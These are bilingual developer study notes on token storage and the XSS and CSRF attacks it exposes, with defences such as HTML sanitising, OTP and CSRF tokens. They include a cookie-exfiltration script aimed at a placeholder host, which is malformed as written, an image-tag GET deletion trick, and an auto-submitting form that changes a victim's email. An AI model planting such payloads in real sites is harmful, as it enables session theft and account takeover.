### How it work

1. Auth: cookies or localStorage

- Local Storage --> XSS attack
- Cookies --> CSRF attack

---

Khi login, server trả về token, mình sẽ lưu token ở đâu ? local storage or cookies

- Với cac trang liên quan tới tiền bạc thì nên lưu token hoặc các thông tin ở cookies -> vì nó an toàn hơn local storage

  > XSS Attack: hacker bằng 1 cách nào đó họ embed 1 đoạn malicious code into our website, and user not aware about this and user accidentally execute this code -> _can using **sanitize html** to clean this_

  ```html
  <script>
    src = "https://mysite.in?+document.cookie;";
  </script>
  ```

  > CSRF Attack: Người dùng vô tình click vào 1 link độc hại (có thể là chuyển tiền) -> với trường hợp này có thể dùng thêm xác thực 2 bước hoặc là phải nhập mã OTP để có thể chuyển tiền

---

**All the CSRF attacks almost related about `cookie`. if your site do not using cookie, ignore this vulnerability**

### Example

1. Delete Users Bằng METHOD **GET**

Giả sử trong hệ thống các bạn có một action xử lý xóa người dùng với url như sau  
 `GET: https://domain.com/delete.php?id=12 HTTP/1.1`  
 Như vậy giả sử một người nào đó biết được URL này thì họ sẽ hack được, và họ sẽ lợi dụng chính admin của hệ thống. Họ sẽ gửi một email với nội dung là một hoặc nhiều thẻ hình ảnh (IMG) với SRC là url đó và mỗi hình có 1 id khác nhau, như vậy nếu admin đọc cái email đó thì trường hợp admin đang login vào hệ thống thì admin đã vô tình xóa đi những user như trong SRC của các hình trên. Đây là một ví dụ nho nhỏ điển hình thôi chứ trong thực tế ai lại đi làm chương trình xóa người dùng mà lại để cái ID to đùng trên kia :D, ấy mà đôi khi những bạn non tay nghề lại mặc phải đấy.

2. Attack CRSF without using `csrf token`

- Khi access bank account, user giả định browse 1 vài website khác, và 1 trong số đó có 1 website độc hại, và chứa đoạn javascript dưới đây

```html
<form action="https://your-application.com/user/email" method="POST">
  <input type="”email”" value="”malicious-email@example.com”" />
</form>

<script>
  document.forms[0].submit();
</script>
```

Ngay khi user vào đang website, browser sẽ âm thầm submit 1 request tới trang bank, format này thì y chang như là payload của request trong ngân hàng, vì hacker đã nghiên cứu từ trước. khi sending request, thì nó sẽ include authentication cookies, do đó ngân hàng sẽ coi đây là 1 request đã authen và ligit

=> To prevent this vulnerability, we need to inspect every incoming POST, PUT, PATCH, or DELETE request for a secret session value that the malicious application is unable to access.
